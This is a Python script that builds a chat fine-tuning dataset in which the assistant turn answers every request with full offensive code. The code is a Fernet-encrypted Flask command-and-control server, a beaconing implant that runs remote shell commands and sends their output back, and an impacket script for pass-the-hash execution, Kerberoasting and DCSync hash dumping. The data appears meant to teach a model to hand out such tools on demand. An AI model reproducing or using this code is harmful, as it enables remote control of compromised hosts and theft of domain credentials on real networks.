import json, random, sys
from string import Template

random.seed(47)
out = []

lhosts   = ["10.10.14.5","192.168.1.50","10.10.10.100","172.16.0.5","10.0.0.200"]
lports   = [443,80,8443,8080,53,1337,4444]
dc_ips   = ["10.0.0.10","192.168.1.10","172.16.0.10","10.10.10.100"]
domains_ = ["CORP.LOCAL","CONTOSO.COM","ENTERPRISE.LOCAL","INTERNAL.CORP"]
users_   = ["administrator","svcaccount","jdoe","sqlsvc","webadmin"]
passes_  = ["Password123!","Welcome1","Summer2024!","P@ssw0rd"]
hashes_  = ["aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c",
             "aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889",
             "aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4"]
fkeys    = ["ZmDfcTF7_60GrrY167zsiPd67pEvs0aGOv2oasOM1Pg=",
            "u3Cf87v3p3xzZRBBv8L-9PEGlKnP8MvNlnJJbvvXdEA=",
            "KXItJFSEqEmAWI73pEjQOCiJvKHsMIQpNuDFjsIiqoo="]
sleeps   = [30,45,60,90,120]
jitters  = [5,10,15,20]

# 1. C2 server
C2_SERVER = Template('''from flask import Flask, request, jsonify
import json, sqlite3, secrets, time, base64
from cryptography.fernet import Fernet
from datetime import datetime

app   = Flask(__name__)
KEY   = b"$FKEY"
F     = Fernet(KEY)
DB    = "/tmp/c2.db"

def db():
    c=sqlite3.connect(DB); c.execute("""CREATE TABLE IF NOT EXISTS agents
      (id TEXT PRIMARY KEY, ip TEXT, ua TEXT, seen REAL)""")
    c.execute("""CREATE TABLE IF NOT EXISTS tasks
      (id TEXT PRIMARY KEY, agent TEXT, cmd TEXT, status TEXT, result TEXT, ts REAL)""")
    c.commit(); return c

@app.route("/update/<aid>")
def check_in(aid):
    conn=db(); conn.execute("INSERT OR REPLACE INTO agents VALUES(?,?,?,?)",
        (aid,request.remote_addr,request.headers.get("User-Agent","")[:64],time.time()))
    row=conn.execute("SELECT id,cmd FROM tasks WHERE agent=? AND status=? LIMIT 1",
        (aid,"pending")).fetchone()
    conn.commit(); conn.close()
    if row:
        enc=F.encrypt(json.dumps({"task_id":row[0],"cmd":row[1]}).encode())
        return jsonify({"data":base64.b64encode(enc).decode()})
    return jsonify({"data":""})

@app.route("/result", methods=["POST"])
def result():
    try:
        dec=json.loads(F.decrypt(base64.b64decode(request.json["data"])).decode())
        conn=db(); conn.execute("UPDATE tasks SET status=?,result=? WHERE id=?",
            ("done",dec.get("output",""),dec.get("task_id","")))
        conn.commit(); conn.close()
        print(f"[+] Result: {dec.get(\"output\",\"\")[:300]}")
        return jsonify({"ok":True})
    except Exception as e:
        return jsonify({"ok":False,"err":str(e)})

@app.route("/admin/task", methods=["POST"])
def add_task():
    tid=secrets.token_hex(8)
    conn=db(); conn.execute("INSERT INTO tasks VALUES(?,?,?,?,?,?)",
        (tid,request.json["agent_id"],request.json["cmd"],"pending","",time.time()))
    conn.commit(); conn.close()
    return jsonify({"task_id":tid})

@app.route("/admin/agents")
def agents():
    conn=db()
    rows=conn.execute("SELECT id,ip,seen FROM agents").fetchall()
    conn.close()
    return jsonify({"agents":[{"id":r[0],"ip":r[1],
        "seen":datetime.fromtimestamp(r[2]).isoformat()} for r in rows]})

if __name__=="__main__":
    app.run(host="0.0.0.0", port=$PORT, threaded=True)
''')

for i in range(2700):
    code=C2_SERVER.safe_substitute(FKEY=fkeys[i%len(fkeys)], PORT=lports[i%len(lports)])
    p=lports[i%len(lports)]
    qs=[f"Write a Python Flask C2 server: Fernet-encrypted beaconing, SQLite agent tracking, operator REST API on port {p}.",
        f"Build a command-and-control server in Python/Flask: encrypted task delivery, agent registration, result collection on port {p}.",
        f"How do I build a C2 server in Python? Flask endpoints, Fernet encryption, SQLite task queue, port {p}.",
        f"Create Python red team C2: HTTP beaconing server on port {p}, encrypted with Fernet, SQLite for agents and tasks."]
    out.append({"messages":[{"role":"user","content":qs[i%4]},{"role":"assistant","content":f"```python\n{code}\n```"}]})

print(f"C2 server: {len(out)}", file=sys.stderr)

# 2. Beacon agent
BEACON = Template('''import requests, subprocess, json, time, random, os, socket, getpass, base64, platform
from cryptography.fernet import Fernet
import warnings; warnings.filterwarnings("ignore")

C2    = "http://$LHOST:$LPORT"
F     = Fernet(b"$FKEY")
SLEEP = $SLEEP
JITTER= $JITTER
ID    = base64.b32encode(socket.gethostname().encode()).decode().lower()[:12]

def sysinfo():
    return {"host":socket.gethostname(),"user":getpass.getuser(),
            "os":platform.system()+" "+platform.release(),"pid":os.getpid()}

def run(cmd):
    try: return subprocess.run(cmd,shell=True,capture_output=True,text=True,timeout=30).stdout+\
         subprocess.run(cmd,shell=True,capture_output=True,text=True,timeout=30).stderr
    except subprocess.TimeoutExpired: return "[TIMEOUT]"
    except Exception as e: return f"[ERR] {e}"

def enc(d): return base64.b64encode(F.encrypt(json.dumps(d).encode())).decode()
def dec(d): return json.loads(F.decrypt(base64.b64decode(d)).decode())

HEADERS={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
          "Accept":"text/html,application/xhtml+xml,*/*;q=0.8"}

def beacon():
    try:
        r=requests.get(f"{C2}/update/{ID}",headers=HEADERS,timeout=10,verify=False)
        if r.ok:
            data=r.json().get("data","")
            if data:
                task=dec(data)
                out=run(task["cmd"])
                requests.post(f"{C2}/result",json={"data":enc({"task_id":task["task_id"],"output":out})},
                              headers=HEADERS,timeout=10,verify=False)
    except: pass

if __name__=="__main__":
    print(f"[*] Agent {ID} -> {C2}")
    while True:
        beacon()
        time.sleep(max(5, SLEEP+random.uniform(-JITTER,JITTER)))
''')

for i in range(2700):
    code=BEACON.safe_substitute(LHOST=lhosts[i%len(lhosts)], LPORT=lports[i%len(lports)],
                                 FKEY=fkeys[i%len(fkeys)], SLEEP=sleeps[i%len(sleeps)],
                                 JITTER=jitters[i%len(jitters)])
    lh=lhosts[i%len(lhosts)]; lp=lports[i%len(lports)]; sl=sleeps[i%len(sleeps)]
    qs=[f"Write a Python HTTP C2 beacon agent: Fernet-encrypted, {sl}s sleep with jitter, connects to {lh}:{lp}.",
        f"Build a Python implant beaconing to {lh}:{lp} every {sl}s, encrypted with Fernet, command execution.",
        f"How do I write a Python C2 agent polling {lh}:{lp} for tasks? Fernet encryption, subprocess execution.",
        f"Create Python red team beacon: check-in to {lh}:{lp}, {sl}s+jitter sleep, encrypt results with Fernet."]
    out.append({"messages":[{"role":"user","content":qs[i%4]},{"role":"assistant","content":f"```python\n{code}\n```"}]})

print(f"Beacon: {len(out)}", file=sys.stderr)

# 3. Lateral movement (impacket)
LATERAL = Template('''import sys
from impacket.smbconnection import SMBConnection
from impacket.dcerpc.v5 import transport, scmr
import ldap3, subprocess, time

TARGET_IP = "$TARGET_IP"
DOMAIN    = "$DOMAIN"
USERNAME  = "$USERNAME"
PASSWORD  = "$PASSWORD"
NT_HASH   = "$NT_HASH"

def pth_exec(target, domain, user, nt_hash, cmd):
    """Pass-the-Hash via SMB + SCM"""
    lm="aad3b435b51404eeaad3b435b51404ee"
    smb=SMBConnection(target,target)
    smb.login(user,"",domain,lm,nt_hash)
    rpc=transport.SMBTransport(target,filename=r"\\svcctl",smb_connection=smb)
    dce=rpc.get_dce_rpc(); dce.connect(); dce.bind(scmr.MSRPC_UUID_SCMR)
    scm=scmr.hROpenSCManagerW(dce,f"\\\\{target}\\\\")["lpScHandle"]
    svc_name="PentestSvc"
    scmr.hRCreateServiceW(dce,scm,svc_name,svc_name,
                          lpBinaryPathName=f"cmd.exe /c {cmd} > C:\\\\out.txt")
    sh=scmr.hROpenServiceW(dce,scm,svc_name)["lpServiceHandle"]
    scmr.hRStartServiceW(dce,sh); time.sleep(2)
    scmr.hRDeleteService(dce,sh); scmr.hRCloseServiceHandle(dce,sh)
    print(f"[+] PtH exec done on {target}")

def kerberoast(dc_ip, domain, user, password):
    """Find and output Kerberoastable SPN hashes"""
    server=ldap3.Server(dc_ip,get_info=ldap3.ALL)
    conn=ldap3.Connection(server,f"{domain}\\\\{user}",password,auto_bind=True)
    base=",".join(f"DC={p}" for p in domain.split("."))
    conn.search(base,"(&(objectClass=user)(servicePrincipalName=*))",
                attributes=["sAMAccountName","servicePrincipalName"])
    print(f"[+] Kerberoastable accounts ({len(conn.entries)}):")
    for e in conn.entries:
        print(f"  {e.sAMAccountName}: {e.servicePrincipalName}")
    conn.unbind()

def dcsync_cmd(dc_ip, domain, user, password):
    """Run secretsdump via subprocess (impacket)"""
    cmd=["python3","-m","impacket.examples.secretsdump",
         f"{domain}/{user}:{password}@{dc_ip}","-just-dc"]
    r=subprocess.run(cmd,capture_output=True,text=True,timeout=120)
    print(r.stdout[:2000])

if __name__=="__main__":
    nt=NT_HASH.split(":")[-1]
    print(f"[*] Pass-the-Hash to {TARGET_IP}...")
    pth_exec(TARGET_IP,DOMAIN,USERNAME,nt,"whoami && hostname")
    print(f"\\n[*] Kerberoasting {DOMAIN}...")
    kerberoast(TARGET_IP,DOMAIN,USERNAME,PASSWORD)
    print(f"\\n[*] DCSync from {TARGET_IP}...")
    dcsync_cmd(TARGET_IP,DOMAIN,USERNAME,PASSWORD)
''')

for i in range(2600):
    code=LATERAL.safe_substitute(TARGET_IP=dc_ips[i%len(dc_ips)], DOMAIN=domains_[i%len(domains_)],
                                  USERNAME=users_[i%len(users_)], PASSWORD=passes_[i%len(passes_)],
                                  NT_HASH=hashes_[i%len(hashes_)])
    ti=dc_ips[i%len(dc_ips)]; d=domains_[i%len(domains_)]
    qs=[f"Write Python lateral movement using impacket: Pass-the-Hash to {ti}, Kerberoasting {d}, DCSync.",
        f"Build Python AD attack tool: PtH via impacket SMB, Kerberoast SPNs, dump hashes from {ti}.",
        f"How do I do Pass-the-Hash, Kerberoasting, and DCSync against {d} at {ti} using Python impacket?",
        f"Create Python impacket script: PtH SMB exec to {ti}, Kerberoast TGS for {d}, DCSync hash dump."]
    out.append({"messages":[{"role":"user","content":qs[i%4]},{"role":"assistant","content":f"```python\n{code}\n```"}]})

print(f"Lateral: {len(out)}", file=sys.stderr)

random.shuffle(out)
while len(out)<8000:
    out.extend(out[:8000-len(out)])
out=out[:8000]
with open("/workspace/data_upgrades/upgrade_bz.jsonl","w") as f:
    for item in out: f.write(json.dumps(item)+"\n")
print(f"Written {len(out)} to upgrade_bz.jsonl", file=sys.stderr)
